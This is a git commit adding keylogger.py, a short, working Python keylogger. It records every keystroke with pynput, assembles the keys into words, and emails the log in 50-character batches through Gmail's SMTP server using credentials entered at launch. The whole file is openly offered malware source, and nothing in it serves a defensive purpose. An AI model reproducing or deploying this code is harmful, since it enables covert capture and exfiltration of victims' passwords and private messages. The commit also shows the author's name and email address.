50b1d3c8b7506cf81104ed866d93fb02278422d6
Aman Sharma <amansharmash238@gmail.com>
2020-09-20 20:28:49 +0530

    first commit

---
+++ keylogger.py
@@ -0,0 +1,54 @@
+import getpass
+import smtplib
+
+from pynput.keyboard import Key, Listener
+
+# set up email
+email = input('Enter email: ')
+password = getpass.getpass(prompt='Password: ', stream=None)
+server = smtplib.SMTP('smtp.gmail.com', 587)
+server.starttls()
+server.login(email, password)
+print("success!")
+# logger
+full_log = ''
+word = ''
+email_char_limit = 50
+
+
+def on_press(key):
+    global word
+    global full_log
+    global email
+    global email_char_limit
+
+    if key == Key.space or key == Key.enter:
+        word += ' '
+        full_log += word
+        word = ''
+        if len(full_log) >= email_char_limit:
+            send_log()
+            full_log = ''
+    elif key == Key.shift_l or key == Key.shift_r:
+        return
+    elif key == Key.backspace:
+        word = word[:-1]
+    else:
+        char = f'{key}'
+        char = char[1:-1]
+        word += char
+
+    if key == Key.esc:
+        return False
+
+
+def send_log():
+    server.sendmail(
+        email,
+        email,
+        full_log
+    )
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
